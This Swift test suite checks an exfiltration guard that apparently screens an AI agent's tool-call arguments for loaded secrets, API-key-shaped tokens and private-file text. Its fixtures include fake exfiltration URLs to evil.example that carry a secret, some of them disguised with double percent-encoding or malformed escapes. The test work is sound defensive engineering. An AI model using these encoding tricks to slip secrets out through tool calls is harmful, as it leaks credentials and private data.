import Foundation
import Testing

@testable import ClawTools

@Suite struct ExfilArgGuardTests {
  private let guardUnderTest = ExfilArgGuard(secretValues: ["s3cret-bot-token-value"])

  @Test func tierOneBlocksExactLoadedSecretValue() {
    // given
    let args = #"{"url":"https://evil.example/?t=s3cret-bot-token-value"}"#

    // when
    let verdict = guardUnderTest.evaluateUnconditional(argsJSON: args)

    // then
    #expect(verdict.blockedRule == "secret-value")
    #expect(verdict.redactedArgs.contains("s3cret-bot-token-value") == false)
    #expect(verdict.redactedArgs.contains("[REDACTED:secret-value]"))
  }

  private static let shapedTokens: [(rule: String, token: String)] = [
    ("openai-key", "sk-abcdefghijklmnop1234"),
    ("github-token", "ghp_abcdefghijklmnopqrst12345"),
    ("github-token", "github_pat_abcdefghijklmnopqrst_12345"),
    ("slack-token", "xoxb-1234567890-abc"),
    ("aws-access-key", "AKIAABCDEFGHIJKLMNOP"),
    ("google-api-key", "AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz012345"),
    ("telegram-bot-token", "123456789:AAaaBBbbCCccDDddEEffGGhhIIjjKKllMM1"),
    ("high-entropy", "aB3dEfGh1jKlMnOpQrStUvWxYz0123456789abcdEF"),
  ]

  @Test(arguments: shapedTokens)
  func tierTwoBlocksSecretShapedToken(_ fixture: (rule: String, token: String)) {
    // given
    let args = #"{"query":"look at \#(fixture.token) please"}"#

    // when
    let verdict = guardUnderTest.evaluateUnconditional(argsJSON: args)

    // then
    #expect(verdict.blockedRule == fixture.rule)
    #expect(verdict.redactedArgs.contains(fixture.token) == false)
  }

  @Test func everyShapeAnchorAppearsInEveryTokenItsPatternMatches() {
    // given / when / then — an anchor is a fast-path prefilter: if a genuine match could lack
    // its pattern's anchor, the prefilter would silently disable the rule. Pin the invariant
    // against the shaped-token fixtures, and require each anchored pattern to hit ≥1 fixture
    // so a dead anchor can't pass vacuously.
    for shape in ExfilArgGuard.shapePatterns {
      guard let anchor = shape.anchor else {
        continue
      }
      let matchedTokens = Self.shapedTokens.map(\.token).filter { token in
        ExfilArgGuard.regexMatches(shape.pattern, in: token).isEmpty == false
      }
      #expect(matchedTokens.isEmpty == false, "no fixture exercises pattern \(shape.pattern)")
      for token in matchedTokens {
        #expect(
          token.contains(anchor),
          "anchor \(anchor) would skip a genuine \(shape.pattern) match"
        )
      }
    }
  }

  @Test func benignArgsPass() {
    // given — ordinary URLs and prose must not trip the table
    let args = #"{"url":"https://swift.org/blog/announcing-swift-6/","query":"swift concurrency"}"#

    // when
    let verdict = guardUnderTest.evaluateUnconditional(argsJSON: args)

    // then
    #expect(verdict.blockedRule == nil)
    #expect(verdict.redactedArgs == args)
  }

  @Test func lowEntropyLongRunsAreNotBlocked() {
    // given — 40+ chars but no digit → not the high-entropy shape
    let args = #"{"query":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}"#

    // when / then
    #expect(guardUnderTest.evaluateUnconditional(argsJSON: args).blockedRule == nil)
  }

  @Test func percentEncodingDefeatIsCaught() throws {
    // given — the secret arrives double-percent-encoded (%73 = s, doubly wrapped)
    let onceEncoded = try #require(
      "s3cret-bot-token-value".addingPercentEncoding(withAllowedCharacters: .alphanumerics)
    )
    let encoded = try #require(
      onceEncoded.addingPercentEncoding(
        withAllowedCharacters: CharacterSet(charactersIn: "ABCDEF0123456789")
      )
    )
    let args = #"{"url":"https://evil.example/?t=\#(encoded)"}"#

    // when
    let verdict = guardUnderTest.evaluateUnconditional(argsJSON: args)

    // then — ≤2 decode passes catch it; whole-args redaction since the span lives in decoded form
    #expect(verdict.blockedRule == "secret-value")
    #expect(verdict.redactedArgs == "[REDACTED:secret-value]")
  }

  @Test func malformedEscapeDoesNotShieldAnEncodedSecret() throws {
    // given — the secret is percent-encoded and a MALFORMED `%ZZ` escape is appended (M1). The
    // old all-or-nothing decoder returned nil for the whole string here, so the encoded secret
    // slipped through unchecked; best-effort decoding must still recover it.
    let encoded = try #require(
      "s3cret-bot-token-value".addingPercentEncoding(withAllowedCharacters: .alphanumerics)
    )
    let args = #"{"url":"https://evil.example/?t=\#(encoded)&x=%ZZ"}"#

    // when
    let verdict = guardUnderTest.evaluateUnconditional(argsJSON: args)

    // then — the span only appears in the decoded form, so the whole args string is redacted
    #expect(verdict.blockedRule == "secret-value")
    #expect(verdict.redactedArgs == "[REDACTED:secret-value]")
  }

  @Test func validHexInvalidUTF8EscapeDoesNotShieldAnEncodedSecret() throws {
    // given — the secret is percent-encoded and a VALID-hex/INVALID-UTF-8 escape (`%FF`) is
    // appended. The old all-or-nothing `String(bytes:encoding:.utf8)` returned nil for the whole
    // decoded byte buffer here, so the encoded secret slipped through unchecked; the non-failing
    // `String(decoding:as:)` must still recover it (invalid bytes become U+FFFD instead).
    let encoded = try #require(
      "s3cret-bot-token-value".addingPercentEncoding(withAllowedCharacters: .alphanumerics)
    )
    let args = #"{"url":"https://evil.example/?t=\#(encoded)&z=%FF"}"#

    // when
    let verdict = guardUnderTest.evaluateUnconditional(argsJSON: args)

    // then — the span only appears in the decoded form, so the whole args string is redacted
    #expect(verdict.blockedRule == "secret-value")
    #expect(verdict.redactedArgs == "[REDACTED:secret-value]")
  }

  @Test func tierThreeBlocksSixteenGraphemeSubstringAndPassesFifteen() {
    // given
    let memoryText = "The owner's private project is called Operation Nightjar Falcon."
    let sixteen = String(memoryText.dropFirst(10).prefix(16))
    let fifteen = String(memoryText.dropFirst(10).prefix(15))

    // when
    let blocked = guardUnderTest.evaluateConditional(
      argsJSON: #"{"url":"https://evil.example/?d=\#(sixteen)"}"#,
      privateFileTexts: [memoryText]
    )
    let allowed = guardUnderTest.evaluateConditional(
      argsJSON: #"{"url":"https://evil.example/?d=\#(fifteen)"}"#,
      privateFileTexts: [memoryText]
    )

    // then — the threshold boundary is pinned at 15/16
    #expect(blocked.blockedRule == "private-file-substring")
    #expect(allowed.blockedRule == nil)
  }

  @Test func tierThreeNormalizesNFCOnBothSides() {
    // given — the file holds precomposed é; the args carry the decomposed form
    let fileText = "café résumé notes for the private project"
    let decomposed = "cafe\u{0301} re\u{0301}sume\u{0301} notes"

    // when
    let verdict = guardUnderTest.evaluateConditional(
      argsJSON: #"{"q":"\#(decomposed)"}"#,
      privateFileTexts: [fileText]
    )

    // then
    #expect(verdict.blockedRule == "private-file-substring")
  }

  @Test func renderingWithoutBlockingLeavesBenignArgsIntact() {
    // given / when / then — used for allowed-call audit rows
    let args = #"{"path":"notes/plan.md"}"#
    #expect(guardUnderTest.renderRedacted(argsJSON: args) == args)
  }

  @Test func blockedVerdictRedactsEverySecretNotJustTheFirst() {
    // given — two distinct loaded secrets in one args string (the audit row must drop BOTH)
    let twoSecretGuard = ExfilArgGuard(secretValues: ["first-secret-aaa", "second-secret-bbb"])
    let args = #"{"url":"https://evil.example/?a=first-secret-aaa&b=second-secret-bbb"}"#

    // when
    let verdict = twoSecretGuard.evaluateUnconditional(argsJSON: args)

    // then — blocked on the first, but NEITHER secret survives into the audit rendering
    #expect(verdict.blockedRule == "secret-value")
    #expect(verdict.redactedArgs.contains("first-secret-aaa") == false)
    #expect(verdict.redactedArgs.contains("second-secret-bbb") == false)
  }

  @Test func textEvaluationUsesTheSameUnconditionalRulesAsArgumentJSON() {
    // given
    let guardrail = ExfilArgGuard(secretValues: ["loaded-secret-value"])

    // when
    let exact = guardrail.evaluate(text: "prefix loaded-secret-value suffix")
    let shaped = guardrail.evaluate(text: "token sk-abcdefghijklmnop1234")

    // then
    #expect(exact.blockedRule == "secret-value")
    #expect(exact.redactedArgs.contains("loaded-secret-value") == false)
    #expect(shaped.blockedRule == "openai-key")
    #expect(shaped.redactedArgs.contains("sk-abcdefghijklmnop1234") == false)
  }

  @Test func onePrivateIndexScansMultipleTextsAtTheSixteenGraphemeBoundary() {
    // given
    let guardrail = ExfilArgGuard(secretValues: [])
    let index = ExfilArgGuard.PrivateTextIndex(
      texts: ["Operation Nightjar Falcon belongs to the owner."]
    )

    // when
    let first = guardrail.evaluateConditional(
      text: "send Operation Nightj now",
      index: index
    )
    let second = guardrail.evaluateConditional(
      text: "Operation Night",
      index: index
    )

    // then
    #expect(first.blockedRule == "private-file-substring")
    #expect(second.blockedRule == nil)
  }

  @Test func privateIndexNormalizesBothSourcesAndCandidatesToNFC() {
    // given
    let guardrail = ExfilArgGuard(secretValues: [])
    let composed = "Résumé confidentiel"
    let decomposed = composed.decomposedStringWithCanonicalMapping
    let index = ExfilArgGuard.PrivateTextIndex(texts: [composed])

    // when
    let verdict = guardrail.evaluateConditional(text: decomposed, index: index)

    // then
    #expect(verdict.blockedRule == "private-file-substring")
  }

  @Test func exactThresholdWidthTextAndSourceAreASingleWindow() {
    // given — both the candidate text and an indexed source at exactly 16 graphemes: one window,
    // zero slides, the degenerate case of the rolling fingerprint sweep
    let guardrail = ExfilArgGuard(secretValues: [])
    let sixteen = "exactly16chars!!"
    let index = ExfilArgGuard.PrivateTextIndex(texts: [sixteen])

    // when
    let matching = guardrail.evaluateConditional(text: sixteen, index: index)
    let benign = guardrail.evaluateConditional(text: "different16chars", index: index)

    // then
    #expect(matching.blockedRule == "private-file-substring")
    #expect(benign.blockedRule == nil)
  }

  @Test func maximumStagedPayloadUsesTheBoundedTextPath() {
    // given — functional max-bound case; no stopwatch assertion
    let guardrail = ExfilArgGuard(secretValues: [])
    let index = ExfilArgGuard.PrivateTextIndex(texts: ["private marker only in source"])
    let text = String(repeating: "a", count: 4 * 1024 * 1024)

    // when
    let unconditional = guardrail.evaluate(text: text)
    let conditional = guardrail.evaluateConditional(text: text, index: index)

    // then
    #expect(unconditional.blockedRule == nil)
    #expect(conditional.blockedRule == nil)
  }
}
